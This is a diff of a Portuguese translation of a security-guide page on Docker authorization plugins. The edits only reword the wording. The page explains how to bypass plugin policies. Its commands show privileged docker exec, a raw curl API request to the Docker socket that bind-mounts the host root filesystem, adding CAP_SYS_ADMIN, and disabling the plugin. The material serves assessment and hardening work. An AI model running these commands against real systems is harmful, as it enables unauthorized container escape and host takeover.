@@ -1,30 +1,30 @@
-# Plugins de Autorização em Runtime
+# Plugins de autorização em runtime
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Visão geral
 
-Os plugins de autorização em runtime são uma camada adicional de políticas que decide se um caller pode executar uma determinada ação do daemon. O Docker é o exemplo clássico. Por padrão, qualquer pessoa que consiga se comunicar com o daemon do Docker tem, efetivamente, amplo controle sobre ele. Os plugins de autorização tentam restringir esse modelo examinando o usuário autenticado e a operação de API solicitada e, em seguida, permitindo ou negando a solicitação de acordo com a política.
+Os plugins de autorização em runtime são uma camada adicional de política que decide se um chamador pode executar uma determinada ação do daemon. Docker é o exemplo clássico. Por padrão, qualquer pessoa que consiga se comunicar com o daemon do Docker efetivamente tem amplo controle sobre ele. Os plugins de autorização tentam restringir esse modelo examinando o usuário autenticado e a operação de API solicitada, permitindo ou negando a solicitação de acordo com a política.
 
-Este tópico merece sua própria página porque altera o modelo de exploração quando um atacante já tem acesso a uma Docker API ou a um usuário no grupo `docker`. Nesses ambientes, a questão já não é apenas "consigo alcançar o daemon?", mas também "o daemon está protegido por uma camada de autorização e, em caso afirmativo, essa camada pode ser bypassada por meio de endpoints não tratados, parsing fraco de JSON ou permissões de gerenciamento de plugins?"
+Este tópico merece sua própria página porque altera o modelo de exploração quando um atacante já tem acesso a uma API do Docker ou a um usuário no grupo `docker`. Nesses ambientes, a questão já não é apenas "consigo alcançar o daemon?", mas também "o daemon está protegido por uma camada de autorização e, em caso afirmativo, essa camada pode ser contornada por endpoints não tratados, parsing fraco de JSON ou permissões de gerenciamento de plugins?"
 
 ## Operação
 
-Quando uma solicitação chega ao daemon do Docker, o subsistema de autorização pode encaminhar o contexto da solicitação para um ou mais plugins instalados. O plugin vê a identidade do usuário autenticado, os detalhes da solicitação, determinados headers e partes do body da solicitação ou da resposta quando o content type é adequado. Vários plugins podem ser encadeados, e o acesso só é concedido se todos os plugins permitirem a solicitação.
+Quando uma solicitação chega ao daemon do Docker, o subsistema de autorização pode encaminhar o contexto da solicitação para um ou mais plugins instalados. O plugin vê a identidade do usuário autenticado, os detalhes da solicitação, determinados headers e partes do corpo da solicitação ou da resposta quando o content type é adequado. Vários plugins podem ser encadeados, e o acesso só é concedido se todos os plugins permitirem a solicitação.
 
-Esse modelo parece robusto, mas sua segurança depende inteiramente de quão completamente o autor da política compreendeu a API. Um plugin que bloqueia `docker run --privileged`, mas ignora `docker exec`, não considera chaves JSON alternativas, como `Binds` no nível superior, ou permite a administração de plugins pode criar uma falsa sensação de restrição e, ao mesmo tempo, deixar abertos caminhos diretos de privilege escalation.
+Esse modelo parece sólido, mas sua segurança depende inteiramente de quão completamente o autor da política compreendeu a API. Um plugin que bloqueia `docker run --privileged`, mas ignora `docker exec`, não reconhece chaves JSON alternativas, como `Binds` no nível superior, ou permite a administração de plugins pode criar uma falsa sensação de restrição e, ao mesmo tempo, deixar abertos caminhos diretos de privilege escalation.
 
 ## Alvos comuns de plugins
 
-Áreas importantes para revisão de políticas incluem:
+Áreas importantes para revisão da política incluem:
 
 - endpoints de criação de containers
 - campos de `HostConfig`, como `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` e opções de compartilhamento de namespaces
-- comportamento do `docker exec`
+- comportamento de `docker exec`
 - endpoints de gerenciamento de plugins
 - qualquer endpoint que possa acionar indiretamente ações de runtime fora do modelo de política pretendido
 
-Historicamente, exemplos como o plugin `authz` da Twistlock e plugins educacionais simples, como `authobot`, facilitaram o estudo desse modelo porque seus arquivos de política e caminhos de código mostravam como o mapeamento entre endpoints e ações era realmente implementado. Para trabalhos de assessment, a lição importante é que o autor da política precisa compreender toda a superfície da API, em vez de apenas os comandos mais visíveis da CLI.
+Historicamente, exemplos como o plugin `authz` da Twistlock e plugins educacionais simples, como `authobot`, facilitaram o estudo desse modelo porque seus arquivos de política e caminhos de código mostravam como o mapeamento entre endpoints e ações era realmente implementado. Para trabalhos de assessment, a lição importante é que o autor da política precisa compreender toda a superfície da API, e não apenas os comandos mais visíveis da CLI.
 
 ## Abuso
 
@@ -36,14 +36,14 @@ docker plugin ls
 ```
 Se você precisar de um profiling mais amplo dos endpoints, ferramentas como `docker_auth_profiler` são úteis porque automatizam a tarefa repetitiva de verificar quais rotas da API e estruturas JSON são realmente permitidas pelo plugin.
 
-Se o ambiente usar um plugin personalizado e você puder interagir com a API, enumere quais campos dos objetos são realmente filtrados:
+Se o ambiente usa um plugin personalizado e você pode interagir com a API, enumere quais campos de objetos são realmente filtrados:
 ```bash
 docker version
 docker inspect <container> 2>/dev/null | head
 curl --unix-socket /var/run/docker.sock http:/version
 curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
 ```
-Essas verificações são importantes porque muitas falhas de autorização são específicas dos campos, e não do conceito. Um plugin pode rejeitar um padrão de CLI sem bloquear completamente a estrutura equivalente da API.
+Essas verificações são importantes porque muitas falhas de autorização são específicas de campos, e não de conceitos. Um plugin pode rejeitar um padrão de CLI sem bloquear completamente a estrutura de API equivalente.
 
 ### Exemplo completo: `docker exec` adiciona privilégios após a criação do container
 
@@ -53,11 +53,11 @@ docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfin
 docker ps
 docker exec -it --privileged <container_id> bash
 ```
-Se o daemon aceitar a segunda etapa, o usuário recuperou um processo interativo privilegiado dentro de um container que o autor da política acreditava estar restrito.
+Se o daemon aceitar a segunda etapa, o usuário terá recuperado um processo interativo privilegiado dentro de um container que o autor da policy acreditava estar restrito.
 
-### Exemplo Completo: Bind Mount Através da API Bruta
+### Exemplo completo: Bind Mount por meio da Raw API
 
-Algumas políticas quebradas inspecionam apenas uma estrutura JSON. Se o bind mount do sistema de arquivos root não for bloqueado de forma consistente, o host ainda poderá ser montado:
+Algumas policies vulneráveis inspecionam apenas uma estrutura JSON. Se o bind mount do sistema de arquivos raiz não for bloqueado de forma consistente, o host ainda poderá ser montado:
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock \
@@ -74,9 +74,9 @@ curl --unix-socket /var/run/docker.sock \
 -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
 http:/v1.41/containers/create
 ```
-O impacto é um escape completo do filesystem do host. O detalhe interessante é que o bypass resulta de uma cobertura incompleta da policy, e não de um bug do kernel.
+O impacto é um escape completo do filesystem do host. O detalhe interessante é que o bypass ocorre devido à cobertura incompleta da policy, e não por causa de um bug no kernel.
 
-### Exemplo completo: Atributo de capability não verificado
+### Exemplo completo: atributo de capability não verificado
 
 Se a policy esquecer de filtrar um atributo relacionado a capabilities, o atacante poderá criar um container que recupera uma capability perigosa:
 ```bash
@@ -88,7 +88,7 @@ docker start <container_id>
 docker exec -it <container_id> bash
 capsh --print
 ```
-Assim que `CAP_SYS_ADMIN` ou uma capability igualmente poderosa estiver presente, muitas técnicas de breakout descritas em [capabilities.md](protections/capabilities.md) e [privileged-containers.md](privileged-containers.md) se tornam acessíveis.
+Quando `CAP_SYS_ADMIN` ou uma capability igualmente poderosa está presente, muitas técnicas de breakout descritas em [capabilities.md](protections/capabilities.md) e [privileged-containers.md](privileged-containers.md) tornam-se acessíveis.
 
 ### Exemplo Completo: Desativando o Plugin
 
@@ -113,15 +113,16 @@ curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
 O que é interessante aqui:
 
 - Mensagens de negação que incluem o nome de um plugin confirmam uma camada de autorização e frequentemente revelam a implementação exata.
-- Uma lista de plugins visível para o atacante pode ser suficiente para descobrir se operações de desativação ou reconfiguração são possíveis.
-- Uma policy que bloqueia apenas ações óbvias da CLI, mas não requisições brutas à API, deve ser tratada como passível de bypass até que se prove o contrário.
+- Uma lista de plugins visível para o atacante pode ser suficiente para descobrir se operações de desabilitação ou reconfiguração são possíveis.
+- Uma policy que bloqueia apenas ações óbvias da CLI, mas não requisições brutas à API, deve ser considerada bypassável até que se prove o contrário.
 
-## Padrões de Runtime
+## Padrões do Runtime
 
 | Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
 | --- | --- | --- | --- |
-| Docker Engine | Não habilitado por padrão | O acesso ao daemon é efetivamente tudo ou nada, a menos que um plugin de autorização esteja configurado | policy de plugin incompleta, blacklists em vez de allowlists, permissão para gerenciar plugins, pontos cegos no nível dos campos |
-| Podman | Não possui um equivalente direto comum | O Podman normalmente depende mais de permissões Unix, execução rootless e decisões de exposição da API do que de plugins de autorização no estilo Docker | expor amplamente uma API Podman rootful, permissões fracas no socket |
-| containerd / CRI-O | Modelo de controle diferente | Esses runtimes normalmente dependem de permissões no socket, limites de confiança do node e controles do orchestrator em camadas superiores, em vez de plugins de autorização do Docker | montar o socket em workloads, pressupostos fracos de confiança local no node |
-| Kubernetes | Usa authn/authz nas camadas do API-server e do kubelet, não plugins de autorização do Docker | RBAC do cluster e controles de admission são a principal camada de policy | RBAC excessivamente amplo, policy de admission fraca, exposição direta das APIs do kubelet ou do runtime |
+| Docker Engine | Não habilitado por padrão | O acesso ao daemon é efetivamente all-or-nothing, a menos que um plugin de autorização seja configurado | policy de plugin incompleta, blacklists em vez de allowlists, permitir o gerenciamento de plugins, pontos cegos em nível de campo |
+| Podman | Não possui um equivalente direto comum | O Podman normalmente depende mais de permissões Unix, execução rootless e decisões de exposição da API do que de plugins de authz no estilo Docker | expor amplamente uma API do Podman rootful, permissões fracas no socket |
+| containerd / CRI-O | Modelo de controle diferente | Esses runtimes normalmente dependem de permissões do socket, limites de confiança do node e controles do orchestrator em camadas superiores, em vez de plugins de authz do Docker | montar o socket em workloads, pressupostos fracos de confiança local no node |
+| Kubernetes | Usa authn/authz nas camadas do API-server e do kubelet, não plugins de authz do Docker | RBAC do cluster e admission controls são a principal camada de policy | RBAC excessivamente amplo, policy de admission fraca, expor diretamente APIs do kubelet ou do runtime |
+
 {{#include ../../../banners/hacktricks-training.md}}
